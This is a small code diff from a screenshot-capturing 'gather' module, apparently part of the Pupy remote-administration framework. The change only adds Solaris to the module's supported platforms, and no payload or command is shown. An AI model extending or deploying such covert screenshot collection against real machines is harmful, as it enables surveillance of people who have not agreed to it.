@@ -40,7 +40,7 @@ import subprocess
 __class_name__="Screenshoter"
 
 
-@config(cat="gather",compatibilities=['windows', 'linux', 'darwin'])
+@config(cat="gather",compatibilities=['windows', 'linux', 'darwin', 'solaris'])
 class Screenshoter(PupyModule):
     """ take a screenshot :) """
 
